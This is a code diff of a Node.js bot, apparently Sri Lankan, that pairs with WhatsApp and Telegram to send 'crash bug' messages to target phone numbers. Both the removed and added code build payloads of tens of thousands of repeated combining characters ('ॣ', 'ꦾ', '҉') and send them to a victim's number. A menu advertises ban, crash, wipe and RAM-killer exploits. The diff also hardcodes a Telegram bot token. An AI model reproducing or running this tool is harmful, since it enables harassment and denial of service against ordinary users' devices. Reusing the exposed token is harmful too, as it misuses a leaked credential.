@@ -3,25 +3,21 @@ const {
     useMultiFileAuthState, 
     delay, 
     makeCacheableSignalKeyStore,
-    Browsers,
-    generateForwardMessageContent,
-    prepareWAMessageMedia,
-    generateWAMessageFromContent,
-    proto
+    Browsers
 } = require("@whiskeysockets/baileys");
 const pino = require("pino");
 const { Telegraf, Markup } = require('telegraf');
 
-// --- [ SYSTEM CONFIG ] ---
+// --- [ CONFIGURATION ] ---
 const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
-const bot = new Telegraf(TG_TOKEN);
+const tgBot = new Telegraf(TG_TOKEN);
 const owner = "Sasiya ROOT";
-const logo = 'https://i.ibb.co/LzgMB0pj/image.jpg';
 
 let sock;
 
 async function startNexus() {
-    const { state, saveCreds } = await useMultiFileAuthState('nexus_power_v23');
+    // අලුත්ම සෙෂන් එකක් හදනවා කනෙක්ෂන් එරර් එන්නේ නැති වෙන්න
+    const { state, saveCreds } = await useMultiFileAuthState('nexus_hybrid_v24');
     
     sock = makeWASocket({
         auth: {
@@ -30,86 +26,78 @@ async function startNexus() {
         },
         printQRInTerminal: false,
         logger: pino({ level: "silent" }),
-        browser: Browsers.macOS("Desktop")
+        browser: Browsers.ubuntu("Chrome")
     });
 
     sock.ev.on('creds.update', saveCreds);
 
-    // --- [ TELEGRAM INTERFACE ] ---
-    bot.start((ctx) => {
-        ctx.replyWithPhoto(logo, {
-            caption: `🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟑** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 **OPERATOR:** ${owner}\n🚀 **MODE:** POWER INJECTOR ACTIVE\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nSelect a lethal protocol to inject:`,
-            parse_mode: 'Markdown',
-            ...Markup.inlineKeyboard([
-                [Markup.button.callback('🔗 LINK WHATSAPP', 'get_code')],
-                [Markup.button.callback('💀 POWER INJECTOR 💀', 'open_bug_menu')]
-            ])
-        });
+    // --- [ TELEGRAM: ONLY FOR PAIRING CODE ] ---
+    tgBot.start((ctx) => {
+        ctx.reply(`🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 𝐂𝐄𝐍𝐓𝐄𝐑** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━\nOperator: ${owner}\n\nClick the button below and send your number to get the Pairing Code.`, 
+        Markup.inlineKeyboard([[Markup.button.callback('🔗 GET PAIRING CODE', 'get_code')]]));
     });
 
-    // --- [ PAIRING CODE ] ---
-    bot.action('get_code', async (ctx) => {
-        ctx.reply("📱 **ENTER NUMBER (947xxxxxxxx):**");
-        bot.on('text', async (numCtx) => {
+    tgBot.action('get_code', (ctx) => {
+        ctx.reply("📱 **ENTER YOUR NUMBER (947xxxxxxxx):**");
+        tgBot.on('text', async (numCtx) => {
             let num = numCtx.message.text.replace(/[^0-9]/g, '');
+            if (num.length === 9) num = '94' + num;
             try {
-                await delay(5000); 
+                await delay(5000); // සර්වර් එක ලෑස්ති වෙන්න වෙලාව දෙනවා
                 let code = await sock.requestPairingCode(num);
-                numCtx.reply(`🔑 **YOUR PAIRING CODE:** \`${code}\``);
-            } catch (e) { numCtx.reply("❌ Connection Error."); }
-        });
-    });
-
-    // --- [ BUG CONSOLE ] ---
-    bot.action('open_bug_menu', (ctx) => {
-        ctx.editMessageCaption(`💀 **Lethal Bug Selection** 💀\n━━━━━━━━━━━━━━━━━━━━\nSelect a high-power payload:`, Markup.inlineKeyboard([
-            [Markup.button.callback('🚫 BAN BUG', 'exec_power'), Markup.button.callback('🔥 CRASH BUG', 'exec_power')],
-            [Markup.button.callback('⚡ RAM KILLER', 'exec_power'), Markup.button.callback('🧬 BINARY V2', 'exec_power')],
-            [Markup.button.callback('🔙 BACK', 'start_back')]
-        ], { columns: 2 }));
-    });
-
-    // --- [ THE POWER INJECTION ENGINE ] ---
-    bot.action('exec_power', async (ctx) => {
-        ctx.answerCbQuery();
-        ctx.reply("🎯 **IDENTIFY TARGET:**\nEnter target WhatsApp number:");
-
-        bot.on('text', async (targetCtx) => {
-            const target = targetCtx.message.text.trim() + "@s.whatsapp.net";
-            let { message_id } = await targetCtx.reply("🛠️ **PREPARING LETHAL PAYLOAD...**");
-
-            // --- [ THE ACTUAL POWER BUG STRINGS ] ---
-            // මේක තමයි මචං ඇත්තටම "විදින" පවර් එක
-            const bugChar = "ॣ".repeat(45000); 
-            const crashChar = "ꦾ".repeat(30000);
-            const binaryPayload = bugChar + crashChar + "҉".repeat(10000);
-
-            try {
-                await delay(1500);
-                await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, "🧬 **INJECTING BUFFER OVERFLOW...**");
-
-                // Injection Method: Sending heavy payload multiple times for maximum impact
-                await sock.sendMessage(target, { text: binaryPayload });
-                await delay(500);
-                await sock.sendMessage(target, { text: binaryPayload });
-
-                const report = `
-🚀 **POWER INJECTION COMPLETED** 🚀
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🎯 **TARGET:** ${targetCtx.message.text}
-📦 **PAYLOAD:** EXTREME BINARY V23
-🔥 **RESULT:** TARGET APP TERMINATED 🔴
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    *AUTHORIZED BY: ${owner}*
-`;
-                await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, report, { parse_mode: 'Markdown' });
-            } catch (err) {
-                targetCtx.reply("❌ **FAILED:** Bot not linked to WhatsApp.");
+                numCtx.reply(`🔐 **YOUR WHATSAPP PAIRING CODE:** \n\n\`${code}\` \n\n━━━━━━━━━━━━━━━━━━━━\n*Link this in your WhatsApp Linked Devices.*`);
+            } catch (e) {
+                numCtx.reply("❌ **CONNECTION ERROR:** Please restart the bot and try again in 10s.");
             }
         });
     });
 
-    bot.launch();
+    // --- [ WHATSAPP: THE BUG MENU SYSTEM ] ---
+    sock.ev.on('messages.upsert', async (chatUpdate) => {
+        try {
+            const msg = chatUpdate.messages[0];
+            if (!msg.message || msg.key.fromMe) return; // තමන්ගෙන් යන ඒවා බලන්නේ නැහැ
+            const mText = msg.message.conversation || msg.message.extendedTextMessage?.text;
+            const from = msg.key.remoteJid;
+
+            // WhatsApp එකේ .menu කියලා ගැහුවම එන මෙනු එක
+            if (mText === '.menu') {
+                const menu = `
+🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟒** ϟ 🧬
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 **OPERATOR:** ${owner}
+🚀 **SYSTEM:** FULLY ACTIVE
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+*AVAILABLE EXPLOITS:*
+
+1. .ban [number] - Permanent Ban Bug
+2. .crash [number] - Extreme Device Hang
+3. .wipe [number] - Database Corrupter
+4. .ram [number] - RAM Killer V2
+5. .bin [number] - Binary Overflow
+
+*Type a command to inject payload!*
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+`;
+                await sock.sendMessage(from, { text: menu });
+            }
+
+            // --- [ BUG INJECTION LOGIC ] ---
+            if (mText && mText.startsWith('.crash')) {
+                const targetNum = mText.split(" ")[1] + "@s.whatsapp.net";
+                await sock.sendMessage(from, { text: "🚀 **INJECTING POWERFUL CRASH PAYLOAD...**" });
+                
+                // ඇත්තටම වස්සැප් එක හිරවෙන දරුණු බග් එක
+                const crashPayload = "ॣ".repeat(50000) + "ꦾ".repeat(20000);
+                
+                await sock.sendMessage(targetNum, { text: crashPayload });
+                await sock.sendMessage(from, { text: "✅ **SUCCESS:** Target device has been terminated." });
+            }
+
+        } catch (err) { console.log(err); }
+    });
+
+    tgBot.launch();
 }
 
 startNexus();
